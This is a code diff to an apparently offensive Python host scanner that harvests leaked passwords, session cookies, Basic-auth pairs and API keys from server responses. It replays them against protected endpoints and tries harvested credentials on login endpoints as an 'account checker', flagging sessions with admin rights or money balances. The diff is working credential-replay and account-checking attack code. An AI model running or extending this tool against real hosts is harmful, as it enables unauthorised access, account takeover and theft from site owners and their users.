@@ -37,6 +37,7 @@ from .ai_verify import (
     verify_integration,
     verify_facebook,
     check_key_balance,
+    check_login,
     verify_secret,
     verify_telegram_bot,
     verify_twilio_pair,
@@ -168,6 +169,23 @@ SENSITIVE_PATTERNS = {
         r'[^{}]{0,200}?"(?:password|admin_password|pwd|pass)"\s*:\s*"[^"]{4,}"'
         r'|"password"\s*:\s*"[^"]{4,}"[^{}]{0,200}?"(?:email|login|username|admin_email|user_email|account|phone|admin_username)"\s*:\s*"[^"]{3,80}"',
         re.I),
+    # Мультиформат-секреты (JSON-тела покрывают паттерны выше):
+    # env/properties (PASSWORD=x), YAML (password: x), XML/SOAP
+    # (<password>x</password>). ^-привязка строк исключает дубли с JSON
+    "password_any": re.compile(
+        r'(?mi)^[ \t]*[A-Z0-9_]{0,24}(?:PASSWORD|PASSWD|PWD|PASS)[A-Z0-9_]{0,16}='
+        r'(?:["\'][^\'"\n]{3,120}["\']|[^#\s\n][^#\n]{2,119})[ \t]*(?:#|$)'
+        r'|^[ \t]*[a-z0-9_]{0,24}(?:password|passwd|pwd)[a-z0-9_]{0,16}[ \t]*:[ \t]*'
+        r'(?:["\'][^\'\n]{3,120}["\']|[^#\s\n][^#\n]{2,119})[ \t]*(?:#|$)'
+        r'|<(?:password|passwd|pwd|admin[_-]?password|user[_-]?password|smtp[_-]?pass)'
+        r'[^>]{0,24}>(?:<!\[CDATA\[)?([^<\s\n][^<\n]{2,120})(?:\]\]>)?</'),
+    "api_key_any": re.compile(
+        r'(?mi)^[ \t]*[A-Z0-9_]{0,24}(?:API_?KEY|APIKEY|SECRET_?KEY|ACCESS_?KEY)[A-Z0-9_]{0,16}='
+        r'(?:["\'][^\'"\n]{6,120}["\']|[^#\s\n][^#\n]{5,119})[ \t]*(?:#|$)'
+        r'|^[ \t]*[a-z0-9_]{0,24}(?:api_?key|apikey|secret_?key)[a-z0-9_]{0,16}[ \t]*:[ \t]*'
+        r'(?:["\'][^\'\n]{6,120}["\']|[^#\s\n][^#\n]{5,119})[ \t]*(?:#|$)'
+        r'|<(?:api_?key|apikey|secret[_-]?key)[^>]{0,24}>'
+        r'(?:<!\[CDATA\[)?([^<\s\n][^<\n]{5,120})(?:\]\]>)?</'),
     # EVM/Tron private key: 64 hex (0x или без) в поле приватного ключа.
     # Широкий охват имён: private_key, PRIVATE_KEY, privateKey, evm_private_key,
     # walletPrivateKey, tron_private_key, owner_key, signer_key, deployer_key,
@@ -562,6 +580,79 @@ def _fuzz_value_variants(val: str) -> list[str]:
 # id'шники в JSON-телах (для id-fuzz: подставляются в GET-шаблоны с {param})
 
 
+# --- replay-входы (фаза 3): cookie-сессии, креды (пары + Basic), api-keys ---
+REPLAY_SESSION_RE = re.compile(
+    r'"(session_id|session_token|sessionid|session|sid|jsessionid|phpsessid)"'
+    r'\s*:\s*"([A-Za-z0-9_.:\-]{8,120})"', re.I)
+# пара логин+пароль в одном объекте (для cred-replay и login-проверки);
+# формы account_pair, значение пароля - реальное (не hash/masked/placeholder)
+REPLAY_PAIR_RE = re.compile(
+    r'"(?:username|login|email|admin_username|account)"\s*:\s*"([^"@\\][^"]{1,80})"'
+    r'[^{}]{0,200}?"(?:password|admin_password|pwd|pass)"\s*:\s*"([^"]{4,})"', re.I)
+REPLAY_BASIC_RE = re.compile(r'"authorization"\s*:\s*"Basic\s+([A-Za-z0-9+/]{8,}={0,2})"', re.I)
+REPLAY_APIKEY_RE = re.compile(
+    r'"(?:api_?key|x_?api_?key|apikey)"\s*:\s*"([A-Za-z0-9_\-]{16,120})"', re.I)
+# login-эндпоинты из спека (POST, без {param}) для фазы 4
+RE_LOGIN_PATH_RE = re.compile(
+    r'login|sign[-_]?in|logon|authenticate|auth/token|/token|session', re.I)
+
+
+def _replay_creds_from_text(text: str, out: list, seen: set, cap: int) -> None:
+    """Креды (user, password): пары логин+пароль + расшифрованные Basic."""
+    for m in REPLAY_PAIR_RE.finditer(text):
+        if len(out) >= cap:
+            return
+        u, p = m.group(1).strip(), m.group(2)
+        if is_masked_value(p) or is_placeholder_value("password", p) \
+                or HASHED_PASSWORD_RE.match(p) or ENCODED_BLOB_RE.match(p):
+            continue
+        if u.lower() in PLACEHOLDER_VALUES:
+            continue
+        if (u, p) not in seen:
+            seen.add((u, p))
+            out.append((u, p))
+    for m in REPLAY_BASIC_RE.finditer(text):
+        if len(out) >= cap:
+            return
+        try:
+            dec = base64.b64decode(m.group(1)).decode("utf-8", "replace")
+        except (ValueError, TypeError):
+            continue
+        u, _, p = dec.partition(":")
+        if u.lower() in PLACEHOLDER_VALUES or p.lower() in PLACEHOLDER_VALUES \
+                or is_masked_value(p):
+            continue
+        if (u, p) not in seen:
+            seen.add((u, p))
+            out.append((u, p))
+
+
+def _replay_sessions_from_text(text: str, out: list, seen: set, cap: int) -> None:
+    """Сессии (имя-поля, значение) для Cookie-replay."""
+    for m in REPLAY_SESSION_RE.finditer(text):
+        if len(out) >= cap:
+            return
+        name, val = m.group(1).lower(), m.group(2)
+        if is_junk_token_value(val) or val in seen:
+            continue
+        seen.add(val)
+        out.append((name, val))
+
+
+def _replay_apikeys_from_text(text: str, out: list, seen: set, cap: int) -> None:
+    """api_key для X-API-Key-replay."""
+    for m in REPLAY_APIKEY_RE.finditer(text):
+        if len(out) >= cap:
+            return
+        val = m.group(1)
+        if val.lower() in PLACEHOLDER_VALUES or UUID_VALUE_RE.match(val) \
+                or re.match(r'(?i)^(fake|mock|demo|test|your|example)[_\-]', val):
+            continue
+        if val not in seen:
+            seen.add(val)
+            out.append(val)
+
+
 def is_junk_token_value(val: str) -> bool:
     """Мусорные значения токенов/session id: fake_/mock_/demo_, даты, без цифр."""
     v = val.strip()
@@ -651,9 +742,19 @@ SEVERITY_MAP = {
     # верифицированные аккаунты/деньги
     "facebook_valid": "HIGH",
     "private_key_money": "CRITICAL",
-    # replay открыл админскую сессию или с деньгами (credits/balance)
-    "token_replay_admin": "CRITICAL",
-    "token_replay_money": "CRITICAL",
+    # replay всех видов: bearer (token_replay выше), cookie (session_replay),
+    # basic (cred_replay), x-api-key (apikey_replay); admin/money-сессии
+    "session_replay": "CRITICAL",
+    "cred_replay": "CRITICAL",
+    "apikey_replay": "CRITICAL",
+    "replay_admin": "CRITICAL",
+    "replay_money": "CRITICAL",
+    # найденный кред открыл login-эндпоинт (одна попытка, не брутфорс)
+    "login_valid": "CRITICAL",
+    "login_admin": "CRITICAL",
+    # мультиформат-секреты (env/YAML/XML)
+    "password_any": "CRITICAL",
+    "api_key_any": "HIGH",
     # is_admin в ответе + фактический вход (путь /admin/* или токен рядом)
     "admin_area": "CRITICAL",
     "admin_access": "CRITICAL",
@@ -745,6 +846,27 @@ def classify_response(body: str) -> tuple[list[str], str]:
                     if is_masked_value(val) or is_placeholder_value("password", val):
                         continue
                     if HASHED_PASSWORD_RE.match(val) or ENCODED_BLOB_RE.match(val):
+                        continue
+
+            # password_any/api_key_any (env/YAML/XML): guards как у JSON-семейства
+            # + YAML-пустышки null/none/~/true/false
+            if name in ("password_any", "api_key_any"):
+                m2 = re.search(r'(?:=|:|>)[ \t]*(?:<!\[CDATA\[)?["\']?([^"\'<\n#]{1,120})', value_text)
+                a_val = (m2.group(1).strip() if m2 else "").rstrip("'\"")
+                if not a_val:
+                    continue
+                if a_val.lower() in ("null", "none", "true", "false", "nil", "~", "yes", "no", "changeme", "x", "xx"):
+                    continue
+                if is_masked_value(a_val) or is_placeholder_value("password" if name == "password_any" else "api_key", a_val):
+                    continue
+                if name == "password_any":
+                    if HASHED_PASSWORD_RE.match(a_val) or HEX_HASH_RE.match(a_val) or ENCODED_BLOB_RE.match(a_val):
+                        continue
+                else:
+                    # api_key: UUID/плейсхолдеры/fake-префиксы; alpha-only ключи
+                    # (aetXhpWvqP) - реальные, digit-гвард тут лишний
+                    if UUID_VALUE_RE.match(a_val) \
+                            or re.match(r'(?i)^(fake|mock|demo|test|your|example)[_\-]', a_val):
                         continue
 
             # Токены: отсеиваем мусорные значения (fake_, даты, без цифр)
@@ -910,6 +1032,16 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             auth_token_sources: dict[str, str] = {}
             protected_gets: list[tuple[str, str]] = []
             token_replay_checks: list[dict[str, Any]] = []
+            # replay-входы фазы 3: cookie-сессии / креды / api-keys
+            replay_sessions: list[tuple[str, str]] = []
+            replay_sessions_seen: set[str] = set()
+            replay_creds: list[tuple[str, str]] = []
+            replay_creds_seen: set[tuple[str, str]] = set()
+            replay_apikeys: list[str] = []
+            replay_apikeys_seen: set[str] = set()
+            # login-эндпоинты (фаза 4: cred-проверка одной попыткой)
+            login_paths: list[str] = []
+            login_checks: list[dict[str, Any]] = []
             # id-fuzz: id'шники из тел + GET-шаблоны с {param} для фазы 2
             fuzz_buckets: dict[str, set[str]] = {}
             param_templates_seen: set[str] = set()
@@ -1051,6 +1183,19 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                             auth_tokens_found.append(tok)
                                             # источник токена (где утёк) для панели
                                             auth_token_sources.setdefault(tok, path_template)
+                                # replay-входы: сессии/креды/api-keys из тел
+                                if cfg.session_replay:
+                                    _replay_sessions_from_text(
+                                        body[:100_000], replay_sessions,
+                                        replay_sessions_seen, cfg.session_replay_max)
+                                if cfg.cred_replay:
+                                    _replay_creds_from_text(
+                                        body[:100_000], replay_creds,
+                                        replay_creds_seen, cfg.cred_replay_max)
+                                if cfg.apikey_replay:
+                                    _replay_apikeys_from_text(
+                                        body[:100_000], replay_apikeys,
+                                        replay_apikeys_seen, cfg.apikey_replay_max)
                                 if cfg.wp_checks:
                                     # маркер + извлечение пар (url можно взять из entry);
                                     # без закрывающей кавычки - ловит и wp_username
@@ -1076,6 +1221,13 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                     # подстановок из тел (id/username/slug/email/...)
                                     if "{" in path_template and method.upper() == "GET":
                                         param_templates_seen.add(path_template)
+                                    # login-эндпоинты (фаза 4): POST без {param}
+                                    # (login обычно открыт - собираем всегда)
+                                    if cfg.login_checks and method.upper() == "POST" \
+                                            and "{" not in path_template \
+                                            and RE_LOGIN_PATH_RE.search(path_template) \
+                                            and len(login_paths) < 5:
+                                        login_paths.append(path_template)
                                     for m in FUZZ_PAIR_RE.finditer(body[:100_000]):
                                         fld = m.group(1).lower()
                                         val = (m.group(2) or "").strip()
@@ -1161,7 +1313,9 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                 ep_data["verdict"] = "PROTECTED"
                                 result.protected_count += 1
                                 # token replay: закрытый GET - цель для фазы 3
-                                if cfg.token_replay and method.upper() == "GET" \
+                                if (cfg.token_replay or cfg.session_replay
+                                        or cfg.cred_replay or cfg.apikey_replay) \
+                                        and method.upper() == "GET" \
                                         and len(protected_gets) < cfg.token_replay_endpoints_max:
                                     protected_gets.append((path_template, test_path))
                             else:
@@ -1287,41 +1441,78 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                         if cfg.twilio_checks:
                                             twilio_pairs_found.update(
                                                 extract_twilio_pairs(fbody[:100_000]))
+                                        # replay-входы из фазовых тел (креды от WP и др.)
+                                        if cfg.session_replay:
+                                            _replay_sessions_from_text(
+                                                fbody[:100_000], replay_sessions,
+                                                replay_sessions_seen, cfg.session_replay_max)
+                                        if cfg.cred_replay:
+                                            _replay_creds_from_text(
+                                                fbody[:100_000], replay_creds,
+                                                replay_creds_seen, cfg.cred_replay_max)
+                                        if cfg.apikey_replay:
+                                            _replay_apikeys_from_text(
+                                                fbody[:100_000], replay_apikeys,
+                                                replay_apikeys_seen, cfg.apikey_replay_max)
                                 except (aiohttp.ClientError, asyncio.TimeoutError):
                                     continue
                     if not fuzz_new:
                         # новых подстановочных значений больше нет - сошлось
                         break
 
-            # Фаза 3 — token replay: access_token, найденный в 200-теле
-            # (напр. GET /api/efi/_debug/authorize отдаёт JWT-пару), подстав-
-            # ляется в protected GET (401/403 из фазы 1) как Authorization:
-            # Bearer. Открылся - auth bypass: публичный authorize минтит
-            # рабочие токены (token_replay CRITICAL). Только GET - пассивно.
-            if cfg.token_replay and auth_tokens_found and protected_gets:
-                replay_seen: set[tuple[str, str]] = set()
-                # per-token агрегатор: что именно открыл токен (для панели)
-                tr_by_token: dict[str, dict[str, Any]] = {
-                    tok: {"token": tok, "source": auth_token_sources.get(tok, ""),
-                          "opened": [], "admin": False, "money": False,
-                          "money_value": "", "identity": ""}
-                    for tok in auth_tokens_found
+            # Фаза 3 — replay: вход, найденный в 200-телах, подставляется в
+            # protected GET (401/403 из фазы 1). Виды входа:
+            #   bearer  - access_token -> Authorization: Bearer (token_replay)
+            #   session - session_id/sid -> Cookie (session_replay)
+            #   cred    - найденная пара логин+пароль / Basic -> Basic (cred_replay)
+            #   apikey  - api_key -> X-API-Key (apikey_replay)
+            # Открылся - auth bypass; replay_admin/replay_money - открытая
+            # сессия админская или с деньгами. Только GET - пассивно.
+            replay_attempts: list[tuple[str, str, str]] = []  # (kind, value, name)
+            if cfg.token_replay:
+                replay_attempts += [("bearer", tok, "") for tok in auth_tokens_found]
+            if cfg.session_replay:
+                replay_attempts += [("session", v, n) for (n, v) in replay_sessions]
+            if cfg.cred_replay:
+                replay_attempts += [("cred", f"{u}:{p}", u) for (u, p) in replay_creds]
+            if cfg.apikey_replay:
+                replay_attempts += [("apikey", k, "") for k in replay_apikeys]
+            if replay_attempts and protected_gets:
+                replay_seen: set[tuple[str, str, str]] = set()
+                # per-вход агрегатор: что именно открыл (для панели)
+                tr_by_token: dict[tuple[str, str], dict[str, Any]] = {
+                    (kind, value): {"kind": kind, "token": value, "name": name,
+                                    "source": auth_token_sources.get(value, ""),
+                                    "opened": [], "admin": False, "money": False,
+                                    "money_value": "", "identity": ""}
+                    for kind, value, name in replay_attempts
                 }
                 token_replay_checks: list[dict[str, Any]] = []
                 for tmpl, ppath in protected_gets:
                     if time.monotonic() >= deadline:
                         break
-                    for tok in auth_tokens_found:
+                    for kind, rvalue, rname in replay_attempts:
                         if time.monotonic() >= deadline:
                             break
-                        if (ppath, tok) in replay_seen:
+                        if (ppath, kind, rvalue) in replay_seen:
                             continue
-                        replay_seen.add((ppath, tok))
+                        replay_seen.add((ppath, kind, rvalue))
+                        # заголовок входа по виду
+                        if kind == "bearer":
+                            rheaders = {"Authorization": f"Bearer {rvalue}"}
+                        elif kind == "session":
+                            # имя поля + стандартные синонимы в одной куке
+                            rheaders = {"Cookie": f"{rname}={rvalue}; session_id={rvalue}"
+                                                  f"; sessionid={rvalue}; sid={rvalue}; JSESSIONID={rvalue}"}
+                        elif kind == "cred":
+                            rheaders = {"Authorization":
+                                        "Basic " + base64.b64encode(rvalue.encode()).decode()}
+                        else:  # apikey
+                            rheaders = {"X-API-Key": rvalue}
                         try:
                             async with session.get(
                                 base_url.rstrip("/") + ppath,
-                                headers={"Authorization": f"Bearer {tok}",
-                                         "Accept": "application/json"},
+                                headers={**rheaders, "Accept": "application/json"},
                                 allow_redirects=False,
                                 timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
                                 proxy=proxy,
@@ -1331,37 +1522,40 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                 rbody = await rresp.text()
                                 rpatterns, rsev = classify_response(rbody[:100_000])
                                 # что за сессия открылась: админ / деньги / личность
-                                tr = tr_by_token.get(tok) or {}
+                                tr = tr_by_token.get((kind, rvalue)) or {}
                                 if tr:
                                     tr["opened"].append(ppath.split("#")[0])
                                     if REPLAY_ADMIN_RE.search(rbody[:2000]) \
                                             or "/admin" in (tmpl + ppath).lower():
                                         tr["admin"] = True
-                                        if "token_replay_admin" not in rpatterns:
-                                            rpatterns.append("token_replay_admin")
+                                        if "replay_admin" not in rpatterns:
+                                            rpatterns.append("replay_admin")
                                     mm = REPLAY_MONEY_RE.search(rbody[:2000])
                                     if mm:
                                         try:
                                             if float(mm.group(1)) > 0:
                                                 tr["money"] = True
                                                 tr["money_value"] = mm.group(1)
-                                                if "token_replay_money" not in rpatterns:
-                                                    rpatterns.append("token_replay_money")
+                                                if "replay_money" not in rpatterns:
+                                                    rpatterns.append("replay_money")
                                         except ValueError:
                                             pass
                                     if not tr["identity"]:
                                         idm = REPLAY_ID_RE.search(rbody[:2000])
                                         if idm:
                                             tr["identity"] = idm.group(1)[:80]
-                                # закрытый эндпоинт открылся токеном - finding
-                                if "token_replay" not in rpatterns:
-                                    rpatterns.append("token_replay")
+                                # закрытый эндпоинт открылся входом - finding
+                                rtag = {"bearer": "token_replay", "session": "session_replay",
+                                        "cred": "cred_replay", "apikey": "apikey_replay"}[kind]
+                                if rtag not in rpatterns:
+                                    rpatterns.append(rtag)
                                 rsev = "CRITICAL" if severity_order.get(
                                     rsev, 0) < 3 else rsev
                                 all_patterns.extend(rpatterns)
                                 rresp_data: dict[str, Any] = {
-                                    # панель: шаблон + пометка auth (через токен)
-                                    "path": tmpl + "#auth",
+                                    # панель: шаблон + пометка входа (kind)
+                                    "path": tmpl + "#" + {"bearer": "auth", "session": "sess",
+                                                          "cred": "cred", "apikey": "key"}[kind],
                                     "method": "GET",
                                     "expects_auth": True,
                                     "status_code": rresp.status,
@@ -1409,11 +1603,42 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                 if cfg.ai_key_checks:
                                     for prov, k in extract_ai_keys(rbody[:100_000]):
                                         ai_keys_found.setdefault(k, prov)
+                                # входы из ОТКРЫТОГО ответа (сессии/креды/api-keys)
+                                if cfg.session_replay:
+                                    _replay_sessions_from_text(
+                                        rbody[:100_000], replay_sessions,
+                                        replay_sessions_seen, cfg.session_replay_max)
+                                if cfg.cred_replay:
+                                    _replay_creds_from_text(
+                                        rbody[:100_000], replay_creds,
+                                        replay_creds_seen, cfg.cred_replay_max)
+                                if cfg.apikey_replay:
+                                    _replay_apikeys_from_text(
+                                        rbody[:100_000], replay_apikeys,
+                                        replay_apikeys_seen, cfg.apikey_replay_max)
                         except (aiohttp.ClientError, asyncio.TimeoutError):
                             continue
-                # в result.data идут только токены, реально открывшие
+                # в result.data идут только входы, реально открывшие
                 # защищённые эндпоинты (с identity/admin/money-атрибутами)
                 token_replay_checks = [tr for tr in tr_by_token.values() if tr["opened"]]
+
+            # Фаза 4 — cred-проверка: найденные пары логин+пароль (из тел,
+            # placeholder/masked отсеяны) пробуются на login-эндпоинте
+            # ОДНОЙ попыткой. Это не брутфорс - проверка реально утёкших
+            # секретов. 200 + токен/профиль = валидный аккаунт (чекер)
+            if cfg.login_checks and replay_creds and login_paths:
+                for u, p in list(replay_creds)[: cfg.login_check_max]:
+                    chk = await check_login(
+                        session, base_url, login_paths[0], u, p,
+                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
+                    )
+                    login_checks.append(chk)
+                    if chk["status"] == "valid":
+                        all_patterns.append("login_valid")
+                        if severity_order.get(max_severity, 0) < 3:
+                            max_severity = "CRITICAL"
+                        if chk.get("admin"):
+                            all_patterns.append("login_admin")
 
             # Проверка AI-ключей: валидность/баланс у провайдеров
             # (только бесплатные эндпоинты - списания нет)
@@ -1759,6 +1984,7 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 "facebook_checks": facebook_checks,
                 "key_balance_checks": key_balance_checks,
                 "token_replay_checks": token_replay_checks,
+                "login_checks": login_checks,
                 "integration_checks": integration_checks,
             }
 
